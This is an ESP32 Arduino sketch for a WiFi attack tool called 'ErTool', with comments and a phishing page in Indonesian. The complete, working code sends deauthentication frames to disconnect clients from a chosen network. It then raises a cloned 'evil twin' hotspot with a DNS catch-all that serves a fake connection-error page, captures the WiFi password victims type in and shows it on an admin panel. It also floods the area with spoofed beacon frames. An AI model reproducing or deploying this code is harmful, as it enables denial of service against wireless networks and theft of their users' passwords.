#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>

// --- STRUKTUR DATA ---
struct _Network {
  String ssid;
  uint8_t bssid[6];
  int ch;
};

_Network _networks[16];
_Network _selectedNetwork;
WebServer server(80);
DNSServer dnsServer;

bool deauth_active = false, hotspot_active = false, beacon_active = false;
String _beaconName = "System_Update", _capturedPass = "";
int _beaconCount = 5;
unsigned long last_attack = 0;

// --- HALAMAN HTML (WEB_PAGES.H) ---
const char _loginHTML[] PROGMEM = R"=====(
<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
  body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
  .box { border: 1px solid #ff9800; padding: 20px; border-radius: 10px; display: inline-block; max-width: 90%; background: #111; }
  input { width: 100%; padding: 15px; margin: 20px 0; background: #222; border: 1px solid #444; color: #fff; }
  button { width: 100%; padding: 15px; background: #ff9800; border: none; font-weight: bold; cursor: pointer; }
</style></head><body>
<div class='box'><h2 style='color:#ff9800'>WIFI CONNECTION ERROR</h2>
<p>Koneksi terputus karena kesalahan sistem. Silakan masukkan password WiFi untuk memulihkan koneksi perangkat Anda.</p>
<form method='POST' action='/login'><input type='password' name='password' placeholder='Password WiFi' required><button type='submit'>PULIHKAN SEKARANG</button></form>
</div></body></html>)=====";

const char _adminHTML[] PROGMEM = R"=====(
<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
  body { background: #1a1a1a; color: #eee; font-family: sans-serif; padding: 10px; }
  table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 12px; }
  th, td { border: 1px solid #444; padding: 10px; text-align: left; }
  .active { background: #f44336 !important; }
  button { padding: 10px; background: #333; color: #fff; border: none; cursor: pointer; border-radius: 4px; }
</style></head><body>
<h1>ErTool Admin Panel</h1>
<form action='/scan' method='POST'><button type='submit' style='background:green'>SCAN WIFI</button></form>
<hr>
<div style='display:flex; gap:10px;'>
  <a href='/?deauth={deauth_val}'><button class='{deauth_class}'>{deauth_btn}</button></a>
  <a href='/?hotspot={hotspot_val}'><button class='{hotspot_class}'>{hotspot_btn}</button></a>
  <a href='/beacon_settings'><button class='{beacon_class}'>BEACON MODE</button></a>
</div>
<table><tr><th>SSID</th><th>CH</th><th>AKSI</th></tr>{table_rows}</table>
<div style='background:#222; padding:10px; border-left: 5px solid lime;'>
  <p>Status: <span style='color:lime'>{result_box}</span></p>
</div>
</body></html>)=====";

const char _beaconHTML[] PROGMEM = R"=====(
<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>
body{background:#1a1a1a; color:#eee; font-family:sans-serif; padding:20px;}
input{width:100%; padding:10px; margin:10px 0; background:#222; color:#fff; border:1px solid #444;}
button{width:100%; padding:15px; background:orange; border:none; font-weight:bold; cursor:pointer;}
</style></head><body>
<h2>BEACON CONFIG</h2>
<form method='POST' action='/beacon_settings'>
  SSID Name: <input type='text' name='s_name' value='{c_name}'>
  Count: <input type='number' name='s_count' value='{c_count}'>
  <input type='hidden' name='action' value='{btn_action}'>
  <button type='submit' class='{btn_class}'>{btn_text}</button>
</form>
<br><a href='/' style='color:#888'>[ Back to Admin ]</a>
</body></html>)=====";

// --- FUNGSI CORE ---
String bytesToStr(const uint8_t* b, uint32_t len) {
  String s = "";
  for (uint32_t i = 0; i < len; i++) {
    s += String(b[i] < 16 ? "0" : "") + String(b[i], HEX);
    if (i < len - 1) s += ":";
  }
  return s;
}

void handleLogin() {
  if (server.hasArg("password")) {
    _capturedPass = server.arg("password");
    Serial.println("!!! PASS: " + _capturedPass);
  }
  server.send(200, "text/html", "<html><body><script>alert('Processing...'); window.location='/';</script></body></html>");
}

void handleBeacon() {
  if (server.hasArg("action")) {
    if (server.arg("action") == "start") {
      beacon_active = true;
      _beaconName = server.arg("s_name");
      _beaconCount = server.arg("s_count").toInt();
    } else { beacon_active = false; }
  }
  String s = _beaconHTML;
  s.replace("{c_name}", _beaconName);
  s.replace("{c_count}", String(_beaconCount));
  s.replace("{btn_action}", beacon_active ? "stop" : "start");
  s.replace("{btn_text}", beacon_active ? "STOP BEACON" : "START BEACON");
  s.replace("{btn_class}", beacon_active ? "active" : "");
  server.send(200, "text/html", s);
}

void handleIndex() {
  if (hotspot_active && server.hostHeader() != WiFi.softAPIP().toString()) {
    server.send(200, "text/html", _loginHTML);
    return;
  }
  if (server.hasArg("ap")) {
    String target = server.arg("ap");
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == target) _selectedNetwork = _networks[i];
    }
  }
  if (server.hasArg("deauth")) deauth_active = (server.arg("deauth") == "start");
  if (server.hasArg("hotspot")) {
    if (server.arg("hotspot") == "start") {
      hotspot_active = true;
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", WiFi.softAPIP());
    } else {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAP("ErTool_Admin", "12345678");
    }
  }

  String rows = "";
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") break;
    String bStr = bytesToStr(_networks[i].bssid, 6);
    rows += "<tr><td>"+_networks[i].ssid+"</td><td>"+String(_networks[i].ch)+"</td>";
    rows += "<td><a href='/?ap="+bStr+"'><button>PILIH</button></a></td></tr>";
  }

  String h = _adminHTML;
  h.replace("{table_rows}", rows);
  h.replace("{deauth_btn}", deauth_active ? "STOP DEAUTH" : "DEAUTH");
  h.replace("{deauth_val}", deauth_active ? "stop" : "start");
  h.replace("{deauth_class}", deauth_active ? "active" : "");
  h.replace("{hotspot_btn}", hotspot_active ? "STOP EVIL" : "EVIL TWIN");
  h.replace("{hotspot_val}", hotspot_active ? "stop" : "start");
  h.replace("{hotspot_class}", hotspot_active ? "active" : "");
  h.replace("{beacon_class}", beacon_active ? "active" : "");
  h.replace("{result_box}", (_capturedPass != "") ? "TERTANGKAP: " + _capturedPass : "Menunggu korban...");
  server.send(200, "text/html", h);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_ps(WIFI_PS_NONE);
  WiFi.softAP("ErTool_Admin", "12345678");
  server.on("/", handleIndex);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/beacon_settings", handleBeacon);
  server.on("/scan", HTTP_POST, []() {
    int n = WiFi.scanNetworks();
    for (int i = 0; i < 16 && i < n; i++) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
    server.sendHeader("Location", "/"); server.send(302);
  });
  server.onNotFound(handleIndex);
  server.begin();
}

void loop() {
  server.handleClient();
  if (hotspot_active) dnsServer.processNextRequest();
  unsigned long now = millis();

  // DEAUTH ENGINE
  if (deauth_active && _selectedNetwork.ssid != "" && now - last_attack > 100) {
    uint8_t pkt[26] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
    memcpy(&pkt[10], _selectedNetwork.bssid, 6);
    memcpy(&pkt[16], _selectedNetwork.bssid, 6);
    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
    last_attack = now;
  }

  // BEACON ENGINE
  if (beacon_active && now - last_attack > 150) {
    uint8_t bPkt[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04, 0x00 };
    int s_len = _beaconName.length();
    bPkt[37] = s_len;
    for(int i=0; i<s_len; i++) bPkt[38+i] = _beaconName[i];
    for(int j=0; j<_beaconCount; j++) {
      for(int k=0; k<6; k++) bPkt[10+k] = bPkt[16+k] = random(256);
      esp_wifi_80211_tx(WIFI_IF_AP, bPkt, 38 + s_len, false);
    }
    last_attack = now;
  }
}
